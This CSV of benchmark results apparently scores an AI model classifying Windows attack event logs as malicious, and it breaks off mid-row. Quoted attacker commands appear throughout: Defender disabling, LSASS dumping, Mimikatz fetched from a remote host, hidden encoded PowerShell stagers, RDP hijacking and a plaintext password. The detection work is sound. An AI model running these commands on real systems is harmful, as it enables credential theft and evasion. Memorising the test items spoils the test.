+The Add-RemoteRegBackdoor.ps1 script grants the 'Everyone' trustee (SID S-1-1-0) ALL_ACCESS (mask 983103) ACEs on sensitive registry keys including the winreg remote-access key, LSA secret-related keys (JD, Skew1, Data, GBG), SECURITY, and SAM, enabling remote retrieval of credential material/secrets. This deliberate weakening of ACLs on credential-bearing hives is a known persistence/credential-access backdoor technique and is not routine administrative activity. The actor OFFSEC\hack1 executed it via WMI StdRegProv against FS03, confirming malicious intent."
+claude-opus-4-8,ID800-4103-4104 Defender critical features disabled (PowerShell).evtx,hard,C,processed,YES,100.0,75.0,YES,"800, 4103, 4104","powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",OFFSEC\admmig,"Set-MpPreference -DisableRealtimeMonitoring $true, Set-MpPreference -DisableIOAVProtection $true, Set-MpPreference -DisableBehaviorMonitoring $true, Set-MpPreference -DisableIntrusionPreventionSystem $true, Set-MpPreference -DisableInboundConnectionFiltering $true, Microsoft.PowerShell.Core\Set-StrictMode -Off",,,0.0,6.09,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 800, 4103, 4104
+- Processes: powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: Set-MpPreference -DisableRealtimeMonitoring $true, Set-MpPreference -DisableIOAVProtection $true, Set-MpPreference -DisableBehaviorMonitoring $true, Set-MpPreference -DisableIntrusionPreventionSystem $true, Set-MpPreference -DisableInboundConnectionFiltering $true, Microsoft.PowerShell.Core\Set-StrictMode -Off
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The account OFFSEC\admmig executed a rapid sequence of Set-MpPreference commands within seconds that systematically disabled Windows Defender protections: real-time monitoring, IOAV protection, behavior monitoring, intrusion prevention, and inbound connection filtering. This is a classic defense-evasion (MITRE T1562.001 Impair Defenses) chain designed to blind antivirus before further malicious activity. The deliberate, sequential disabling of multiple security features is not consistent with routine administration and strongly indicates attacker behavior."
+claude-opus-4-8,ID4688-5447-4950-Firewall disabled (command).evtx,hard,C,context_exceeded,NO,0.0,0.0,NO,,,,,,,,2.95,,,,,,,"Error: Anthropic rejected the request - Error code: 400 - {'type': 'error', 'error': {'type': 'invalid_request_error', 'message': 'prompt is too long: 1250796 tokens > 1000000 maximum'}, 'request_id': 'req_011Cc5z1okUN3oudiRyYC75t'}"
+claude-opus-4-8,"ID4742,4935,4662,4661,5137-DCshadow attack (GLOBAL) failed.csv",,,processed,YES,100.0,50.0,YES,"4662, 4742, 4935, 5137, 5136, 4936, 4929",,"admmig, JUMP01$",,"jump01.offsec.lan, rootdc1.offsec.lan",,0.0,8.26,3.0,6.0,4.0,3,16.0,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4662, 4742, 4935, 5137, 5136, 4936, 4929, 4662
+- Processes: None
+- Accounts: admmig, JUMP01$
+- Commands: None
+- Network: jump01.offsec.lan, rootdc1.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The account admmig modified the servicePrincipalName attribute of the JUMP01$ computer object and the source (jump01.offsec.lan) attempted DRS replication (Event 4929, 4932-style replication events with status codes 8452/1722), which is consistent with a DCSync/DCShadow-style attack that registers a rogue DC and abuses GUID-based replication SPNs (E3514235-... DRS service class). The combination of SPN manipulation on a non-DC computer object plus replication attempts from that host to the real DC (rootdc1) is a strong indicator of a DCShadow attack rather than routine administration."
+claude-opus-4-8,ID4103-4104-CrackMapExec payload execution.evtx,medium,A,processed,YES,100.0,72.2,YES,"4104, 4103",powershell.exe,OFFSEC\admmig,"powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')( $(Sv 'Ofs' '' ) +[StriNG]('...').SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1')","https://10.23.123.11:443/Invoke-Mimikatz.ps1, https://10.23.123.11:443/",,0.0,8.90,4.3,6.0,4.0,3,17.3,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4104, 4103
+- Processes: powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')( $(Sv 'Ofs' '' ) +[StriNG]('...').SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ), Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit', IEX (New-Object Net.WebClient).DownloadString('https://10.23.123.11:443/Invoke-Mimikatz.ps1')
+- Network: https://10.23.123.11:443/Invoke-Mimikatz.ps1, https://10.23.123.11:443/
+- Registry: None
+
+EXPLANATION:
+This is a clear malicious attack: heavily obfuscated PowerShell launched with execution-bypass, no-profile, hidden-window flags decodes a payload that disables AMSI ([Ref].Assembly amsiInitFailed reflection), downloads Invoke-Mimikatz from a remote host, and runs credential-dumping commands (privilege::debug sekurlsa::logonpasswords) before exfiltrating results via HTTP POST. The activity was executed by OFFSEC\admmig and was flagged/blocked as malicious content by antivirus, confirming credential-theft intent."
+claude-opus-4-8,ID800-4103-4104 Defender exclusion added (PowerShell).evtx,medium,C,processed,YES,100.0,75.0,YES,"800, 4103, 4104","powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",OFFSEC\admmig,"Set-MpPreference -ExclusionPath c:\document\virus\, Set-MpPreference -ExclusionExtension '.exe', Microsoft.PowerShell.Core\Set-StrictMode -Off",,,0.0,4.92,4.5,6.0,4.0,3,17.5,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 800, 4103, 4104
+- Processes: powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: Set-MpPreference -ExclusionPath c:\document\virus\, Set-MpPreference -ExclusionExtension '.exe', Microsoft.PowerShell.Core\Set-StrictMode -Off
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The user OFFSEC\admmig used PowerShell to add Windows Defender exclusions for a path named ""c:\document\virus\"" and for all "".exe"" files, which disables antivirus scanning on those locations and file types. This is a classic defense evasion technique (MITRE T1562.001) used to allow malware to execute undetected, and the suspicious folder name ""virus"" combined with excluding all executables strongly indicates malicious intent rather than legitimate administration."
+claude-opus-4-8,ID5145-4624-DonPAPI full extraction.csv,,,processed,YES,100.0,70.8,YES,"1102, 4985, 4702, 4624, 4964, 4672, 5140, 5145, 4674, 4688, 4662","C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe","hack1, admmig, FS03VULN$, LOCAL SERVICE, ANONYMOUS LOGON","C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd"", \??\C:\Windows\system32\conhost.exe 0xffffffff",10.23.123.11,,0.0,13.07,4.2,6.0,4.0,4,18.2,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4985, 4702, 4624, 4964, 4672, 5140, 5145, 4674, 4688, 4662
+- Processes: C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\services.exe
+- Accounts: hack1, admmig, FS03VULN$, LOCAL SERVICE, ANONYMOUS LOGON
+- Commands: C:\Windows\SYSTEM32\cmd.exe /c ""C:\tools\shell.cmd"", \??\C:\Windows\system32\conhost.exe 0xffffffff
+- Network: 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+The log opens with Event 1102 (Security log cleared) by user ""hack1"" — a classic anti-forensic action — followed by privileged NTLM logons (including an NTLM V1 ANONYMOUS LOGON) from 10.23.123.11 and admmig with SeDebug/SeImpersonate privileges. The actor remotely writes random .tmp files into ADMIN$\SYSTEM32 (PsExec/SMBexec-style service execution via svcctl/winreg), spawns cmd.exe running C:\tools\shell.cmd, and systematically harvests DPAPI master keys, Credentials, Vault, browser profiles (Firefox/Chrome), VNC ini files, RDCMan and mRemoteNG configs across every user profile. This pattern of log clearing, lateral movement via admin shares, and mass credential/secret theft is clearly malicious attacker behavior."
+claude-opus-4-8,ID1-12-13-Wdigest authentication activation.evtx,easy,A,processed,YES,100.0,80.0,YES,"1, 12, 13","C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe",OFFSEC\admmig,reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1,,"HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",0.0,5.54,4.8,6.0,4.0,4,18.8,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1, 12, 13
+- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe
+- Accounts: OFFSEC\admmig
+- Commands: reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+- Network: None
+- Registry: HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
+
+EXPLANATION:
+The reg.exe command sets the WDigest UseLogonCredential value to 1, which forces Windows to store plaintext credentials in memory, enabling credential theft via tools like Mimikatz. The event correlation shows the registry key creation (Event 12) and value set to DWORD 0x00000001 (Event 13) executed under a high-integrity cmd.exe session, matching ATT&CK techniques T1112 and T1003. This is a clear credential-access preparation step and is malicious."
+claude-opus-4-8,ID1-LSASS dump with LSASSY (SYSMON).evtx,easy,B,processed,YES,100.0,68.9,YES,"18, 1, 7, 11, 10","C:\Windows\system32\wbem\wmiprvse.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\rundll32.exe, C:\Windows\system32\lsass.exe",OFFSEC\admmig,"powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full | Wait-Process -Id (Get-Process rundll32).id"", ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full",,,0.0,7.76,4.1,6.0,4.0,4,18.1,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 18, 1, 7, 11, 10
+- Processes: C:\Windows\system32\wbem\wmiprvse.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\rundll32.exe, C:\Windows\system32\lsass.exe
+- Accounts: OFFSEC\admmig
+- Commands: powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full;Wait-Process -Id (Get-Process rundll32).id"", ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This is a clear LSASS credential dumping attack using the comsvcs.dll MiniDump technique, spawned via WMI (wmiprvse.exe parent) and executed by powershell.exe and rundll32.exe. Event 10 confirms rundll32.exe opened lsass.exe with GrantedAccess 0x1FFFFF (full access) and a CallTrace through dbghelp.dll/comsvcs.dll, and Event 11 shows the resulting dump file C:\Windows\Temp\76nivOxA.dmp being written. The remote WMI execution chain and credential theft objective make this malicious."
+claude-opus-4-8,ID10-Mimikatz LSASS process dump.evtx,easy,A,processed,YES,100.0,100.0,YES,"1, 10","C:\TOOLS\Mimikatzx64\mimikatz.exe, C:\Windows\System32\cmd.exe, C:\Windows\system32\lsass.exe","OFFSEC\admmig, NT AUTHORITY\SYSTEM","mimikatz.exe, cmd.exe, ""C:\Windows\system32\cmd.exe""",,,0.0,4.88,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1, 10
+- Processes: C:\TOOLS\Mimikatzx64\mimikatz.exe, C:\Windows\System32\cmd.exe, C:\Windows\system32\lsass.exe
+- Accounts: OFFSEC\admmig, NT AUTHORITY\SYSTEM
+- Commands: mimikatz.exe, cmd.exe, ""C:\Windows\system32\cmd.exe""
+- Network: None
+- Registry: None
+
+EXPLANATION:
+Mimikatz, a known credential-dumping tool, was executed at High integrity by OFFSEC\admmig and opened a handle to lsass.exe (GrantedAccess 0x1010) to extract credentials. It then spawned a child cmd.exe running as NT AUTHORITY\SYSTEM, indicating privilege escalation to SYSTEM. The combination of LSASS access and SYSTEM-level shell from a credential theft tool is clearly malicious."
+claude-opus-4-8,ID11-LSASS credentials dump via Task Manager.evtx,easy,A,processed,YES,100.0,100.0,YES,11,C:\Windows\System32\Taskmgr.exe,admmig,,,,0.0,3.38,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 11
+- Processes: C:\Windows\System32\Taskmgr.exe
+- Accounts: admmig
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+This event shows Taskmgr.exe creating a file named ""lsass (4).DMP"" in the user's Temp directory, indicating a memory dump of the LSASS process. Dumping LSASS memory is a well-known credential theft technique used to extract password hashes and credentials. The ""(4)"" suffix suggests repeated dumping attempts, further supporting malicious credential-harvesting activity."
+claude-opus-4-8,ID11-Mimikatz LSA SSP clear text password exfiltration.evtx,easy,A,processed,YES,100.0,100.0,YES,11,C:\Windows\system32\lsass.exe,,,,,0.0,3.69,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 11
+- Processes: C:\Windows\system32\lsass.exe
+- Accounts: None
+- Commands: None
+- Network: None
+- Registry: None
+
+EXPLANATION:
+The creation of C:\Windows\System32\mimilsa.log by lsass.exe is a well-known artifact of Mimikatz's misc::memssp module, which injects a malicious SSP to capture plaintext credentials. The RuleName T1003 (OS Credential Dumping) and the mimilsa.log filename strongly indicate credential theft activity rather than legitimate system behavior."
+claude-opus-4-8,ID800-4103-4104-Firewall configuration enumerated (PowerShell).evtx,hard,C,context_exceeded,NO,0.0,0.0,NO,,,,,,,,6.84,,,,,,,"Error: Anthropic rejected the request - Error code: 400 - {'type': 'error', 'error': {'type': 'invalid_request_error', 'message': 'prompt is too long: 1654365 tokens > 1000000 maximum'}, 'request_id': 'req_011Cc5z6ujXMYePQDfoQqJz8'}"
+claude-opus-4-8,ID4103-4104 - SPN discovery (moder nPowerShell).evtx,hard,C,processed,YES,100.0,95.0,YES,"4104, 4103, 4100",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,OFFSEC\admmig,"$SPNName = 'MSSQLSvc/Svc-SQL-DB01.offsec.lan', Add-Type -AssemblyNAme System.IdentityModel, New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName, Set-StrictMode -Version 1.0","MSSQLSvc/Svc-SQL-DB01.offsec.lan, fs02.offsec.lan",,0.0,5.52,5.7,5.0,4.0,2,16.7,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4104, 4103, 4100
+- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- Accounts: OFFSEC\admmig
+- Commands: $SPNName = 'MSSQLSvc/Svc-SQL-DB01.offsec.lan', Add-Type -AssemblyNAme System.IdentityModel, New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName, Set-StrictMode -Version 1.0
+- Network: MSSQLSvc/Svc-SQL-DB01.offsec.lan, fs02.offsec.lan
+- Registry: None
+
+EXPLANATION:
+The sequence sets an MSSQLSvc SPN variable, loads System.IdentityModel, then requests a KerberosRequestorSecurityToken for that SPN — a classic Kerberoasting technique used to extract service ticket hashes for offline cracking. This manual PowerShell activity targeting a SQL service account SPN is consistent with credential-access/privilege-escalation behavior rather than routine administration."
+claude-opus-4-8,ID6004-DNS-server-failed zone transfer.evtx,easy,A,processed,YES,100.0,100.0,YES,6004,,,,"10.23.23.9, non-existing.lan., google.com., hacking-zone.lan., rootdc1.offsec.lan",,0.0,4.00,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 6004
+- Processes: None
+- Accounts: None
+- Commands: None
+- Network: 10.23.23.9, non-existing.lan., google.com., hacking-zone.lan., rootdc1.offsec.lan
+- Registry: None
+
+EXPLANATION:
+A single source IP (10.23.23.9) is generating repeated DNS queries in quick succession, including for non-existing and suspicious domains like ""non-existing.lan."" and ""hacking-zone.lan."", which is consistent with DNS reconnaissance or enumeration activity. Event ID 6004 indicates the DNS server received dynamic update or query requests that fail, and the pattern of probing both internal and external (google.com.) names suggests scanning rather than normal client resolution."
+claude-opus-4-8,ID5145-DNS hosts files access via network share.evtx,easy,A,processed,YES,100.0,83.3,YES,5145,,admmig,,10.23.23.9,,0.0,5.94,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 5145
+- Processes: None
+- Accounts: admmig
+- Commands: None
+- Network: 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+A single user (admmig from 10.23.23.9) is repeatedly accessing the administrative C$ share on fs03vuln, traversing into sensitive system paths including WINDOWS\SYSTEM32\DRIVERS\ETC and the hosts file, and even reading the hosts:Zone.Identifier alternate data stream. This pattern of remote admin-share access to modify the hosts file is consistent with lateral movement and DNS/redirection tampering rather than routine file activity. The combined access requests with write masks (0x100081) over critical system directories strengthens the assessment of malicious intent."
+claude-opus-4-8,ID4624-Anonymous login with domain specified (DonPapi).evtx,easy,A,processed,YES,100.0,100.0,YES,4624,,"ANONYMOUS LOGON, admmig",,10.23.123.11,,0.0,4.34,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4624
+- Processes: None
+- Accounts: ANONYMOUS LOGON, admmig
+- Commands: None
+- Network: 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+A single source IP (10.23.123.11) generated an ANONYMOUS LOGON via NTLM V1 immediately followed by a rapid burst of NTLM Type 3 network logons for the privileged account ""admmig"" within milliseconds of each other, indicating automated/scripted authentication rather than normal user activity. This pattern of an anonymous logon followed by high-frequency privileged-account logons from one host is consistent with credential relay or lateral-movement tooling against fs03vuln."
+claude-opus-4-8,ID4661-Local group enumeration with RID brutforce with CME.evtx,easy,A,processed,YES,100.0,100.0,YES,"4661, 4662",C:\Windows\System32\lsass.exe,"admmig, ROOTDC1$",,rootdc1.offsec.lan,,0.0,6.97,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4661, 4662
+- Processes: C:\Windows\System32\lsass.exe
+- Accounts: admmig, ROOTDC1$
+- Commands: None
+- Network: rootdc1.offsec.lan
+- Registry: None
+
+EXPLANATION:
+A single account (admmig) systematically enumerated the SAM_SERVER, SAM_DOMAIN, and a comprehensive sweep of every SAM_ALIAS/built-in domain group (S-1-5-32-544 through 582 and domain RIDs like 517/553/571/572) within seconds via lsass.exe, which is the hallmark of automated AD group/domain reconnaissance (e.g., DCSync/BloodHound-style enumeration). The accompanying 4662 events accessing the DS object {832b1c45-...} with the replication-related property set indicate directory replication/secrets access typical of a DCSync attack. This rapid, exhaustive privileged-object access pattern against a domain controller is not consistent with normal interactive administration."
+claude-opus-4-8,"ID4624,4688,5140,5145-Eternal Romance - MS17_010_psexec (GLOBAL).csv",,,processed,YES,100.0,83.0,YES,"1102, 4964, 4672, 4624, 5140, 5145, 4688, 4673","cmd.exe, powershell.exe, conhost.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\lsass.exe","admmig, FS03VULN$, LOCAL SERVICE","C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'} | $s=New-Object System.Diagnostics.ProcessStartInfo | $s.FileName=$b | $s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('...')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))' | $s.UseShellExecute=$false | $s.RedirectStandardOutput=$true | $s.WindowStyle='Hidden' | $s.CreateNoWindow=$true | $p=[System.Diagnostics.Process]::Start($s) | ""","10.23.123.11, 10.23.23.9",,16.7,11.49,5.0,6.0,3.3,4,18.3,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 1102, 4964, 4672, 4624, 5140, 5145, 4688, 4673
+- Processes: cmd.exe, powershell.exe, conhost.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\lsass.exe
+- Accounts: admmig, FS03VULN$, LOCAL SERVICE
+- Commands: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('...')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);""
+- Network: 10.23.123.11, 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+The Security log was cleared (1102) followed by a remote NTLM logon from 10.23.123.11 to the IPC$ and ADMIN$ shares accessing svcctl (service control / psexec-style remote execution), spawning cmd.exe that launches a hidden, base64-encoded GZip-compressed PowerShell payload — a classic obfuscated stager. The presence of a ""MS17_010_psexec.evtx"" file accessed on admmig's desktop and the LSASS LsaRegisterLogonProcess privilege use confirm EternalBlue/PsExec-style lateral movement and post-exploitation activity. The combination of log clearing, encoded fileless PowerShell, and admin-share remote service execution is strongly indicative of an attack."
+claude-opus-4-8,"ID5140-5145,4688,4697-Encrypted payload deployed with service over SMB (GLOBAL).csv",,,processed,YES,100.0,73.9,YES,"5140, 5145, 4697, 4688","powershell.exe, cmd.exe, conhost.exe, services.exe, cscript.exe, MOFWriter.exe, ASMHost.exe, SecEdit.exe, MusNotification.exe, MonitoringHost.exe","admmig, SRVDEFENDER01$","C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'} | $s=New-Object System.Diagnostics.ProcessStartInfo | ...[System.Convert]::FromBase64String(''H4sIAPU7gGAC...''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))', ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""",10.23.123.11,,0.0,11.04,4.4,6.0,4.0,4,18.4,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 5140, 5145, 4697, 4688
+- Processes: powershell.exe, cmd.exe, conhost.exe, services.exe, cscript.exe, MOFWriter.exe, ASMHost.exe, SecEdit.exe, MusNotification.exe, MonitoringHost.exe
+- Accounts: admmig, SRVDEFENDER01$
+- Commands: C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c ""if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;...[System.Convert]::FromBase64String(''H4sIAPU7gGAC...''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))', ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
+- Network: 10.23.123.11
+- Registry: None
+
+EXPLANATION:
+This is a clear remote service-based execution attack (PsExec/SMBExec-style): the admmig account connects over SMB to IPC$ and ADMIN$ shares from 10.23.123.11, accesses the svcctl named pipe (Service Control Manager), and creates a service (iOWamcEn / EventID 4697) running as LocalSystem whose binary is a Base64-gzip-compressed, obfuscated PowerShell payload executed with -nop -w hidden -noni (Empire/Cobalt-Strike launcher pattern). The service spawns cmd.exe → powershell.exe → SysWOW64 powershell.exe under services.exe, which is a textbook lateral-movement and code-execution chain. The repeated cscript MonitorKnowledgeDiscovery.vbs and MOFWriter/ASMHost/SecEdit activity is legitimate Microsoft Monitoring Agent baseline activity and is benign, but the encoded PowerShell service install is the malicious signal."
+claude-opus-4-8,"ID4688,4778,4779 RDP hijack direct.evtx",easy,A,processed,YES,100.0,74.0,YES,"4688, 4779, 4778","cmd.exe, tscon.exe, TSTheme.exe, AtBroker.exe, rdpclip.exe, taskhostw.exe, dllhost.exe, svchost.exe, winlogon.exe","FS01$, admmig, admmarsid","cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8",10.23.23.9,,0.0,7.08,4.4,5.0,4.0,3,16.4,B,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688, 4779, 4778
+- Processes: cmd.exe, tscon.exe, TSTheme.exe, AtBroker.exe, rdpclip.exe, taskhostw.exe, dllhost.exe, svchost.exe, winlogon.exe
+- Accounts: FS01$, admmig, admmarsid
+- Commands: cmd  /k tscon 2 /dest:rdp-tcp#8, tscon  2 /dest:rdp-tcp#8
+- Network: 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+A SYSTEM-context cmd.exe (SubjectUserName FS01$, S-1-5-18) launched tscon.exe with ""/dest:rdp-tcp#8"" to hijack session 2, which is the classic RDP session hijacking technique allowing connection to another user's session without credentials. The resulting disconnect (4779 admmig) and reconnect (4778 admmarsid) on the same RDP-Tcp#8 session from JUMP01/10.23.23.9 confirms an actor stealing/swapping another user's interactive session via tscon abuse. This privileged session takeover by SYSTEM is a strong indicator of lateral movement / privilege abuse."
+claude-opus-4-8,ID4688-4778 RDP hijack command execution.evtx,easy,A,processed,YES,100.0,81.5,YES,"4688, 4778","sc.exe, cmd.exe, tscon.exe, conhost.exe, TSTheme.exe, rdpclip.exe, AtBroker.exe, rdpinput.exe, consent.exe, taskhostw.exe, dllhost.exe, mmc.exe, backgroundTaskHost.exe","admmig, FS01$, admmarsid","sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s",10.23.23.9,,0.0,7.68,4.9,6.0,4.0,4,18.9,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4688, 4778
+- Processes: sc.exe, cmd.exe, tscon.exe, conhost.exe, TSTheme.exe, rdpclip.exe, AtBroker.exe, rdpinput.exe, consent.exe, taskhostw.exe, dllhost.exe, mmc.exe, backgroundTaskHost.exe
+- Accounts: admmig, FS01$, admmarsid
+- Commands: sc.exe  start hijackservice, cmd.exe /k tscon 2 /dest:rdp-tcp#5, tscon  2 /dest:rdp-tcp#5, ""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" /s
+- Network: 10.23.23.9
+- Registry: None
+
+EXPLANATION:
+A SYSTEM-level (FS01$, S-1-5-18) process spawned by services.exe runs ""tscon 2 /dest:rdp-tcp#5"" to hijack another user's RDP session (admmarsid) without credentials, a classic RDP session-hijacking privilege escalation technique confirmed by the 4778 session reconnect from client JUMP01 (10.23.23.9). Additionally, ""sc.exe start hijackservice"" indicates a malicious/abused service, and the launch of eventvwr.msc with high-integrity mmc.exe is consistent with the known eventvwr UAC bypass. The combination of service abuse, SYSTEM-driven session hijacking, and UAC bypass strongly indicates malicious attacker activity."
+claude-opus-4-8,"ID4688,4697,5140-5145 PSexec remote execution + admin share.evtx",easy,A,processed,YES,100.0,69.4,YES,"4624, 5140, 5145, 4674, 4697, 4688","PSEXESVC.exe, C:\Windows\PSEXESVC.exe, C:\Windows\System32\services.exe, C:\Windows\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe, C:\Windows\System32\HOSTNAME.EXE, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe","admmig, SRVDEFENDER01$","C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula , whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""",10.23.42.22,,0.0,7.43,4.2,6.0,4.0,4,18.2,A,"MALICIOUS: YES
+
+EVIDENCE:
+- Event IDs: 4624, 5140, 5145, 4674, 4697, 4688
+- Processes: PSEXESVC.exe, C:\Windows\PSEXESVC.exe, C:\Windows\System32\services.exe, C:\Windows\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe, C:\Windows\System32\HOSTNAME.EXE, C:\Windows\System32\cscript.exe, C:\Program Files\Microsoft Monitoring Agent\Agent\MonitoringHost.exe
+- Accounts: admmig, SRVDEFENDER01$
+- Commands: C:\Windows\PSEXESVC.exe, ""cmd.exe"" -u demo\admmig -p Admin1235 -accepteula , whoami, hostname, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
+- Network: 10.23.42.22
